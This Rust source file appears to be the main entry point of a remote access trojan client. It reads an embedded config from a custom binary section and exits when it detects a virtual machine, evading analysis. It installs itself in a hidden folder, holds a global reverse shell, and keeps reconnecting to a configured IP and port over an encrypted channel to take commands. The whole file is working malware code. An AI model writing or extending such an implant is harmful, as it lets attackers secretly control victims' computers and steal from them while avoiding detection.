// #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
// #![cfg_attr(debug_assertions, windows_subsystem = "windows")]

#[no_mangle]
#[link_section = ".zzz"]
static CONFIG: [u8; 1024] = [0; 1024];

use std::time::Duration;
use winapi::um::winuser::SetProcessDPIAware;

pub mod features;
pub mod service;
pub mod handler;
pub mod plugin_manager;

use tokio::{net::TcpStream, sync::oneshot, time::sleep};
use common::{connection::Connection, packets::*};

use std::sync::Mutex;
use once_cell::sync::Lazy;

use features::encryption;

static MUTEX_SERVICE: Lazy<Mutex<service::mutex::MutexLock>> = Lazy::new(||
    Mutex::new(service::mutex::MutexLock::new())
);

static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
    Mutex::new(features::reverse_shell::ReverseShell::new())
);

#[tokio::main(flavor = "current_thread")]
async fn main() {
    let config = service::config::get_config();

    if config.anti_vm_detection && service::anti_vm::anti_vm_detection() {
        std::process::exit(0);
    }

    unsafe {
        // FIX REMOTE DESKTOP DPI ISSUES
        SetProcessDPIAware();
    }

    {
        // MUTEX SERVICE
        let mut mutex_lock_guard = MUTEX_SERVICE.lock().unwrap();
        mutex_lock_guard.init(config.mutex_enabled, config.mutex.clone());
    }

    if config.install {
        service::install::install(config.install_folder.clone(), config.file_name.clone(), config.enable_hidden);
    }


    // Main connection loop
    loop {
        // Connect to server phase
        println!("Connecting to server...");
        
        let socket = match TcpStream::connect(format!("{}:{}", config.ip, config.port)).await {
            Ok(socket) => socket,
            Err(e) => {
                println!("Connection failed: {}. Retrying in 5 seconds...", e);
                sleep(Duration::from_secs(5)).await;
                continue;
            }
        };

        // Encryption handshake phase
        println!("Connected to server. Performing encryption handshake...");
        let connection = Connection::<ClientboundPacket, ServerboundPacket>::new(socket);
        
        let encryption_result = encryption::perform_encryption_handshake(connection).await;
        
        match encryption_result {
            Ok((encryption_state, reader, writer)) => {
                // println!("Encryption handshake successful!");
                // Setup communication channel between reader and writer
                let (tx, rx) = oneshot::channel::<()>();

                // Start writer task
                let write_task = tokio::spawn(
                    handler::writing_loop(
                        writer, 
                        rx, 
                        encryption_state.secret.clone(), 
                        encryption_state.nonce_generator_write
                    )
                );
                
                // Small delay to ensure writer is ready
                sleep(Duration::from_millis(100)).await;
                
                // Start reader task (will block until connection ends)
                handler::reading_loop(
                    reader, 
                    tx, 
                    encryption_state.secret.clone(), 
                    encryption_state.nonce_generator_read
                ).await;
                
                // Wait for writer to complete
                if let Err(e) = write_task.await {
                    println!("Write task error: {}", e);
                }
                
                // println!("Connection ended. Reconnecting in 5 seconds...");
                sleep(Duration::from_secs(5)).await;
            },
            Err(_) => {
                // println!("Encryption handshake failed: {}. Retrying in 5 seconds...", e);
                sleep(Duration::from_secs(5)).await;
            }
        }
    }
}